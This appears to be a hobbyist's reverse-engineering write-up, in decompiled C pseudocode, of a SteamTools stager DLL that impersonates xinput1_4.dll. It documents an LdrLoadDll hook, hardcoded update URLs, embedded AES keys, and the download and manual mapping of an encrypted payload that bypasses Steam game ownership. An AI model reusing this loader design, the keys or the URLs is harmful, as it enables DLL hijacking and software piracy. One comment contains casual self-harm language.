                    free(buf);
                    CloseHandle(hFile);

                    // compare hashes
                    if (CompareHashes(existingHash, fhash))
                    {
                        // hash matches, skip download
                        continue;
                    }
                }
            }
        }

        // ── download the file ─────────────────────────────
        // (the actual download uses sub_180001B00 which i already
        //  described, its a libcurl wrapper with temp file + decrypt, so yeah)

        // ── if default==1 and file changed: SELF-UPDATE ──
        if (isDef == 1)
        {
            // the file changed and it's marked as "default" (core payload)
            // kill current steam and restart

            WCHAR cmdLine[MAX_PATH];
            GetModuleFileNameW(NULL, cmdLine, 260);   // steam.exe path
            WCHAR cwd[MAX_PATH];
            GetCurrentDirectoryW(260, cwd);

            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;

            // kill the event so new steam doesnt think we're already running
            CloseHandle(hEvent);

            // launch new steam with same args
            if (CreateProcessW(cmdLine, GetCommandLineW(),
                               NULL, NULL, FALSE, 0, NULL, cwd, &si, &pi))
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);

                // kill ourselves
                TerminateProcess(GetCurrentProcess(), 0);
            }
        }
    }

    return 0;
}

// ====================================================================
// HTTP REQUEST WRAPPER at sub_180001B00
// ====================================================================
// full libcurl http client wrapper. ~800 bytes. handles:
//   - GET/POST with custom headers
//   - ssl/tls via schannel
//   - proxy support (reads from config)
//   - redirect following
//   - timeout (default 300 seconds)
//   - max download size (default 500MB, lmao generous)
//   - temp file download for large files
//   - in-memory download for small responses (< some threshold)
//
// the result struct at offset 0 is a status code (0=ok, 1=init failed,
// 2=bad url, 3=http error, 4=size exceeded, 5=read error)
// data and size fields at offset 8+ contain the response or file path.
//
// the curl options set include:
//   CURLOPT_URL (10002)
//   CURLOPT_WRITEFUNCTION (20011) -> sub_180001880 (write callback)
//   CURLOPT_TIMEOUT (13)
//   CURLOPT_FOLLOWLOCATION (52)
//   CURLOPT_SSL_VERIFYPEER (64) = 1 (verify)
//   CURLOPT_SSL_VERIFYHOST (81) = 2 (verify)
//   CURLOPT_BUFFERSIZE (98) = 256KB
//   CURLOPT_VERBOSE (213) = 1 (debug logging)
//   CURLOPT_DEBUGFUNCTION (10102)
//   CURLOPT_NOPROGRESS (43) = 0
//   CURLOPT_XFERINFOFUNCTION (20056)
//   CURLOPT_USERAGENT (10004)
//   CURLOPT_HTTPHEADER (10023)
//
// error codes handled (switch on result):
//   6  = couldnt resolve host
//   7  = couldnt connect
//   22 = http returned error
//   23 = write error
//   28 = timeout
//   35 = ssl connect error
//   56 = recv error

__int64 __fastcall sub_180001B00(void* result, const char* url)
{
    memset(result, 0, 296);  // result struct

    sub_1800016B0("http request init\n");

    // ── one-time curl init ────────────────────────────────
    if (!dword_1800A07E4)
    {
        sub_1800016B0("curl global init\n");
        if (sub_180010370(3))  // curl_global_init(CURL_GLOBAL_DEFAULT)
        {
            *(int*)result = 1;  // init failed
            strcpy((char*)result + 32, "CURL initialization failed");
            return (__int64)result;
        }
        dword_1800A07E4 = 1;
    }

    // ── validate url ─────────────────────────────────────
    if (!url || !*url)
    {
        *(int*)result = 2;
        strcpy((char*)result + 32, "URL cannot be empty");
        return (__int64)result;
    }

    // ── create curl handle ───────────────────────────────
    void* curl = sub_180010120();  // curl_easy_init()
    if (!curl)
    {
        *(int*)result = 1;
        strcpy((char*)result + 32, "Failed to create CURL handle");
        return (__int64)result;
    }

    // ── configure curl options ───────────────────────────
    curl_easy_setopt(curl, 10002, url);        // CURLOPT_URL
    curl_easy_setopt(curl, 52, 1);             // CURLOPT_FOLLOWLOCATION
    curl_easy_setopt(curl, 64, 1);             // CURLOPT_SSL_VERIFYPEER
    curl_easy_setopt(curl, 81, 2);             // CURLOPT_SSL_VERIFYHOST
    curl_easy_setopt(curl, 98, 0x40000);       // CURLOPT_BUFFERSIZE
    curl_easy_setopt(curl, 213, 1);            // CURLOPT_VERBOSE
    curl_easy_setopt(curl, 13, 300);           // CURLOPT_TIMEOUT
    curl_easy_setopt(curl, 20, 300);           // CURLOPT_CONNECTTIMEOUT

    // ── perform request ──────────────────────────────────
    DWORD tickStart = GetTickCount();
    int curlErr = sub_1800101E0(curl);  // curl_easy_perform()
    DWORD tickEnd = GetTickCount();

    sub_1800016B0("request took %u ms\n", tickEnd - tickStart);

    // ── handle errors ────────────────────────────────────
    if (curlErr)
    {
        *(int*)result = 3;
        const char* errStr = sub_180010F50(curlErr);  // curl_easy_strerror()
        strncpy((char*)result + 32, errStr, 255);
        sub_1800100D0(curl);  // curl_easy_cleanup()
        return (__int64)result;
    }

    // ── read response ───────────────────────────────────
    long httpCode = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpCode);
    double contentLength = 0;
    curl_easy_getinfo(curl, CURLINFO_CONTENT_LENGTH_DOWNLOAD, &contentLength);

    sub_1800016B0("http %ld, size %.0f\n", httpCode, contentLength);

    // ── read downloaded data from temp file or memory ────
    // (the write callback stored it in a temp file)

    // cleanup
    sub_1800100D0(curl);  // curl_easy_cleanup()
    return (__int64)result;
}

// ====================================================================
// DECRYPT + DECOMPRESS at sub_1800026E0
// ====================================================================
// takes encrypted data blob, decrypts with AES-256-CBC, decompresses
// zlib, and returns the final plaintext. used for both version.json
// and the payload dll
//
// format on input: [16 bytes IV][AES-256-CBC ciphertext]
// format internally: [4 bytes size][zlib compressed data]
// format on output: plain decompressed bytes
//
// first 16 bytes of the encrypted blob are copied as-is (the IV),
// the rest (size-16) is the ciphertext.
// after decryption, first 4 bytes = uncompressed size (little-endian),
// the rest = zlib stream with 78da or 78 9c magic.
//
// returns 1 on success with outData and outSize set.
// returns 0 on any failure (null input, too small, decrypt fail, etc)

__int64 __fastcall sub_1800026E0(
    void* encryptedData,
    unsigned __int64 encryptedSize,
    void* keyMaterial,
    void** outData,
    size_t* outSize)
{
    if (!encryptedData) return 0;
    if (encryptedSize < 16) return 0;  // need at least IV

    unsigned __int64 ctSize = encryptedSize - 16;
    void* iv = encryptedData;
    void* ct = (BYTE*)encryptedData + 16;

    // allocate space for decrypted output (same size as ct)
    void* decrypted = malloc(ctSize + 1);
    if (!decrypted) return 0;

    // ── AES decrypt ──────────────────────────────────────
    // uses custom AES implementation with T-tables at:
    //   dword_18009E270, dword_18009E670,
    //   dword_18009EA70, dword_18009EE70
    // and S-Box at byte_18009D070
    //
    // the function sub_18000CD70 sets up the AES key schedule
    // sub_18000CB90 does the actual CBC decrypt in-place

    AES_Ctx ctx;
    sub_18000CD60(&ctx);                // init context
    sub_18000CD70(&ctx, keyMaterial, 256);  // set key
    sub_18000CB90(&ctx, 0, ctSize, iv, ct, decrypted);  // CBC decrypt
    sub_18000CD40(&ctx);                // clear context (wipe key)

    // ── check for zlib compression ───────────────────────
    unsigned __int64 decSize = ctSize;
    BYTE* dec = (BYTE*)decrypted;

    // the last 16 bytes might be padding, check for zlib magic
    // minimum: 4 byte size header + 5 bytes zlib (worst case per spec)
    if (ctSize >= 9)
    {
        BYTE paddingLen = dec[ctSize - 1];
        if (paddingLen <= 0x10 && paddingLen < ctSize)
        {
            // PKCS7-style padding detected
            unsigned __int64 actualLen = ctSize - paddingLen;

            // check for zlib magic at offset 4
            if (actualLen > 4)
            {
                uint32_t uncompSize = *(uint32_t*)dec;
                if (uncompSize <= 0xA00000)  // sanity: max 10mb
                {
                    BYTE* compressedStart = dec + 4;
                    size_t compressedLen = actualLen - paddingLen - 4;

                    // zlib magic: 78 01, 78 9c, or 78 da
                    if (compressedLen >= 2
                        && compressedStart[0] == 0x78)
                    {
                        // decompress
                        void* decompBuf = malloc(uncompSize + 1);
                        if (decompBuf)
                        {
                            int zerr = sub_180008A90(
                                decompBuf, &uncompSize,
                                compressedStart, compressedLen);

                            if (zerr == 0)  // Z_OK
                            {
                                ((BYTE*)decompBuf)[uncompSize] = 0;
                                *outData = decompBuf;
                                *outSize = uncompSize;
                                free(decrypted);
                                return 1;
                            }
                            free(decompBuf);
                        }
                    }
                }
            }
        }
    }

    // no zlib or decompression failed, return raw decrypted
    // (strip padding if present)
    BYTE padLen = dec[ctSize - 1];
    if (padLen <= 0x10)
    {
        ((BYTE*)decrypted)[ctSize - padLen] = 0;
        ctSize -= padLen;
    }

    *outData = decrypted;
    *outSize = ctSize;
    return 1;
}

// ====================================================================
// OTHER NOTABLE FUNCTIONS
// ====================================================================

// sub_18000ECE0 - checks if hook system is already initialized
// probably reads some global flag set after the first successful hook

// sub_18000ECD0 - finalizes the hook installation
// flushes instruction cache, restores memory protections

// sub_18000ECC0 - removes the hook (for uninstall/cleanup)
// restores original bytes at the hooked address

// sub_18000ED80 - additional cleanup after hook removal
// frees tracking structures

// sub_18000EA30 (already detailed above) - the main hook installer

// sub_18000F1D0 - resolves the module base for a given address
// probably calls RtlPcToFileHeader or similar

// sub_18000F4F0 - validates an address is readable
// probably calls IsBadReadPtr or VirtualQuery

// sub_18000F530 - suspends all threads except current
// uses CreateToolhelp32Snapshot + Thread32First/Next + OpenThread + SuspendThread

// sub_18000F200 - resumes all previously suspended threads
// iterates the saved thread list and calls ResumeThread

// sub_180010370 - curl_global_init wrapper
// calls the real curl_global_init with flags

// sub_180010120 - curl_easy_init wrapper

// sub_1800101E0 - curl_easy_perform wrapper

// sub_1800100D0 - curl_easy_cleanup wrapper

// sub_1800100F0 - curl_easy_getinfo wrapper

// sub_180010F50 - curl_easy_strerror wrapper

// sub_1800104B0 - curl_slist_append wrapper (for headers)

// sub_180010540 - curl_slist_free_all wrapper

// sub_1800138E0 - curl_easy_setopt wrapper
// takes curl handle, option id, and value

// sub_180022DC0 - file logger
// writes formatted string to steamtools.log on disk

// sub_180022F40 - debug output logger
// formats and outputs to OutputDebugStringA with mutex

// sub_1800144B0 - mutex lock/unlock for thread-safe logging

// sub_18004ECA4 - file write with buffering
// used to write downloaded data to disk

// sub_18004EED0 - fopen wrapper (wide char path)

// sub_18004E57C - fclose wrapper

// sub_18004E898 - fseek wrapper

// sub_18004E328 - ftell wrapper

// sub_18004F854 - fread wrapper

// sub_18004DCB0 - malloc wrapper (calls HeapAlloc)

// sub_18004F5E0 - free wrapper (calls HeapFree)

// ====================================================================
// FULL STARTUP SEQUENCE (RECONSTRUCTED)
// ====================================================================
//
// WHEN xinput1_4.dll IS IN STEAM'S DIRECTORY:
//
// 1. steam.exe starts
// 2. steam loader resolves imports, sees xinput1_4.dll in known dlls
// 3. LoadLibrary("xinput1_4.dll") -> DllMain fires
//    -> sub_180044220: init security cookie
//    -> sub_180043FCC: CRT init (runs static constructors)
//
// 4. static constructor calls sub_180001320 (main init)
//    -> creates Global\Vale_SteamIPC_Class<PID> event (instance check)
//    -> checks if steamclient.dll AND SteamUI.dll are loaded
//    -> if both loaded (steam already running):
//       -> call sub_1800039B0 immediately (download payload now)
//    -> if NOT both loaded (steam still starting):
//       -> check command line for -startupwait
//       -> wait on Global\Valve_SteamIPC_Class event (3 sec timeout)
//       -> get ntdll.dll handle, resolve LdrLoadDll
//       -> sub_18000EA30: install LdrLoadDll inline hook
//          -> suspends all threads
//          -> patches first 14 bytes with jmp to sub_180001220
//          -> resumes threads
//
// 5. steam continues loading modules...
//    eventually steam loads crashhandler.dll
//    -> LdrLoadDll hook fires -> sub_180001220
//    -> checks if loaded dll is crashhandler.dll (obfuscated string compare)
//    -> YES IT IS -> THIS IS THE TRIGGER
//    -> uninstall the LdrLoadDll hook (dont need it anymore)
//    -> call sub_1800039B0 (HttpLoadDLL)
//
// 6. sub_1800039B0 (HttpLoadDLL):
//    -> logs "HttpLoadDLL called"
//    -> iterates version urls: tnkjmec.com -> wudrm.com -> steamcdn.com
//    -> for each url, extracts hostname, does dns check
//    -> generates machine fingerprint via CPUID:
//       V{GenuineIntel}_F{6}_M{14}_C{8}
//    -> XOR fingerprint with "version" using CRC polynomial 0x85E1C3D753D46D27
//    -> hash result to get <mCode> token
//    -> sub_180001B00: HTTP GET {versionUrl}
//    -> sub_1800026E0: decrypt response (AES-256-CBC + zlib)
//       using VERSION_KEY at 0x180083FF8
//    -> save decrypted version.json to appcache\version
//
// 7. sub_180003530: parse version.json
//    -> cJSON_Parse the decrypted json
//    -> read package/branch to decide Stable vs Beta
//    -> get WindowsFile64{Stable|Beta} array
//    -> for each file in array:
//       -> sub_180002F70: download file
//          -> expand %USERPROFILE% and <mCode> in filename
//          -> check if already cached with correct hash
//          -> if not: sub_180001B00 HTTP GET file
//          -> sub_1800026E0 decrypt + decompress
//             using PAYLOAD_KEY at 0x180083FD8
//          -> save to appcache\httpcache\3b\<mCode>
//          -> if default==1 and file changed:
//             -> launch new steam.exe with same args
//             -> TerminateProcess(current)
//
// 8. sub_1800450A0: load the decrypted payload PE into memory
//    -> manual map the DLL (no LoadLibrary, all manual)
//    -> resolve imports, apply relocations
//    -> call payload's DllMain(DLL_PROCESS_ATTACH)
//    -> payload takes over from here
//
// 9. payload (Core_payload.dll) initialization:
//    -> (see Core_payload_decompiled.c for the rest)
//    -> opens localcache.db, creates tables
//    -> loads config, writes nTickets
//    -> copies steamclient64.dll -> bin\diversion64.dll
//    -> installs CreateInterface hook
//    -> steam now thinks u own all the games
//
// WHEN Core.dll IS IN STEAMTOOLS DIRECTORY:
//    exact same flow except the dll is loaded by SteamTools.exe
//    instead of steam.exe. the init checks which process its in
//    and either waits for steam to start or proceeds directly.

// im so fucking tired of writing this shit, im gonna kill myself :sob:

// ====================================================================
// KEY STRINGS (decoded from obfuscated constants)
// ====================================================================
//
// dll names (all obfuscated by sub_180001080):
//   "crashhandler.dll"   -> 0xC64E86CE16168676, 0x2636A64E74263636
//   "steamclient.dll"    -> 0xCE2EA686B6C63696, 0xA6762E7426363600
//   "SteamUI.dll"        -> 0xCA2EA686B6AA9274, 0x2636360000000000
//   "ntdll.dll"          -> 0x762E263636742636, 0x3600000000000000
//
// export names (plaintext, resolved via GetProcAddress):
//   "LdrLoadDll"         -> from ntdll.dll
//
// version urls (plaintext in .rdata at 0x180084100/128/148):
//   "https://update.tnkjmec.com/version"
//   "http://update.wudrm.com/version"
//   "http://update.steamcdn.com/version"
//
// steam ipc events:
//   "Global\\Vale_SteamIPC_Class%u"   -> our instance mutex (typo intentional)
//   "Global\\Valve_SteamIPC_Class"    -> real steam event (CORRECT spelling)
//
// command line flag:
//   "-startupwait"                    -> steam boot flag we check for
//
// fingerprint format:
//   "V%s_F%X_M%X_C%X"               -> machine fingerprint template
//
// file paths:
//   "appcache"                        -> download cache directory
//   "appcache\\version"               -> cached version.json
//   "appcache\\httpcache\\3b\\"       -> payload cache dir
//   "C:\\Users\\Default"              -> fallback path

// ====================================================================
// ENCRYPTION KEYS
// ====================================================================
//
// VERSION_KEY (at stager offset 0x180083FF8, 32 bytes):
//   used to decrypt the version.json fetched from update urls
//   09 51 3c 19 34 d7 c0 b2 16 4b 57 e2 c2 66 c4 1d
//   2e a1 83 75 1c c5 e0 1b c6 34 2a df 98 7d 90 73
//
// PAYLOAD_KEY (at stager offset 0x180083FD8, first 32 bytes):
//   used to decrypt the Core payload dll
//   31 4c 20 86 15 05 74 e1 5c f1 1d 1b c1 71 25 1a
//   47 08 6c 00 26 93 55 cd 51 c9 3a 42 3c 14 02 94
//
// the remaining 16 bytes at 0x180083FE8 are padding or a second key:
//   09 51 3c 19 34 d7 c0 b2 16 4b 57 e2 c2 66 c4 1d
//
// both keys are embedded as raw bytes in the .rdata section.
// the payload's corresponding keys are at different offsets
// but the KEY VALUES ARE DIFFERENT between stager and payload.
// stager has its own keys for downloading, payload has its own
// keys for whatever internal encryption it does.

// ====================================================================
// IMPORTS OF INTEREST (Auto Generated, im not writing this by myself, i just commented)
// ====================================================================
//
// kernel32:
//   CreateEventA, OpenEventA, WaitForSingleObject
//   GetModuleHandleW, GetModuleFileNameW
//   GetProcAddress, LoadLibraryA, FreeLibrary
//   GetCurrentProcessId, GetCurrentThreadId
//   GetSystemDirectoryW, GetCommandLineW
//   CreateProcessW, TerminateProcess
//   VirtualAlloc, VirtualFree, VirtualProtect
//   CreateToolhelp32Snapshot, Thread32First, Thread32Next
//   OpenThread, SuspendThread, ResumeThread
//   GetThreadContext, SetThreadContext
//   FlushInstructionCache
//   HeapAlloc, HeapFree, HeapReAlloc, HeapCreate
//   IsDebuggerPresent
//   GetSystemInfo, GetNativeSystemInfo
//   Sleep, GetTickCount, QueryPerformanceCounter
//   GetSystemTimeAsFileTime
//   OutputDebugStringA
//   FindFirstFileExW, FindNextFileW, FindClose
//   CreateDirectoryW, CreateFileW, ReadFile, WriteFile
//   GetFileAttributesW, GetFileSize, SetFilePointerEx
//   WideCharToMultiByte, MultiByteToWideChar
//
// advapi32:
//   CryptAcquireContextA, CryptCreateHash, CryptHashData
//   CryptGetHashParam, CryptDestroyHash, CryptReleaseContext
//   CryptGenRandom
//   RegOpenKeyExA, RegQueryValueExA
//
// shell32:
//   SHGetKnownFolderPath, SHGetFolderPathW
//   CommandLineToArgvW
//
// crypt32:
//   CryptQueryObject, CryptStringToBinaryA
//   CertOpenStore, CertFindCertificateInStore
//   (full cert chain validation for ssl)
//
// ws2_32:
//   socket, connect, send, recv, closesocket
//   (libcurl needs these)

// ====================================================================
// ANTI-ANALYSIS NOTES
// ====================================================================
//
// the stager has very basic anti-analysis:
//   - IsDebuggerPresent check (easily bypassed)
//   - obfuscated strings (bit-shuffle, not encryption)
//   - inline asm in some functions (rcr/rcl, but less than payload)
//   - fake exports (cJSON instead of XInput)
//
// the payload has much better protections:
//   - heavy rcr/rcl obfuscation in key functions
//   - split initialization across static constructors
//   - thread pool tracking with spinlocks
//   - 5388 functions vs 1474 (4x the surface area to analyze)
//
// neither binary is packed. both are plain MSVC /MT compiled PE files.
// no themida, no VMProtect, no custom packer. the obfuscation is
// entirely source-level (inline asm macros) and compiler-level (/O2
// optimization making the control flow harder to follow).
//
// the fact that both binaries have EXACTLY the same skeleton (same
// number of functions, same segments, same entry point count) confirms
// they were compiled from the same project with different configs.
// the stager is basically a stripped-down payload with only the
// download+load code and none of the steam hooking logic.

// ====================================================================
// SUMMARY
// ====================================================================
//
// the stager is elegant in its simplicity:
//   1. get loaded into steam's process (via xinput1_4.dll impersonation
//      or via SteamTools.exe direct loading)
//   2. if steam isnt ready yet, hook LdrLoadDll and wait for
//      crashhandler.dll to load
//   3. when triggered, download encrypted version.json from one of
//      3 hardcoded urls
//   4. decrypt + decompress to see where the real payload lives
//   5. download + decrypt + decompress the payload dll
//   6. manual-map it into memory and call its entry point
//   7. the payload takes over all steam interaction from there
//
//
// whoever wrote this knew exactly what they were doing lmfao. the crashhandler
// trigger is perfect timing, the dual-key encryption means even if
// someone dumps one key they cant get everything (even tho with time they will somehow), the xinput1_4.dll
// disguise is creative as fuck (u would expect for Steam to verify the dll imports/exports asjhdhjasd), and the whole thing is clean enough
// that antivirus didnt flag it for years (or i dont fucking know how many times steamtools is open for :ppp)
//
// gg wp to the original dev. this was fun to reverse.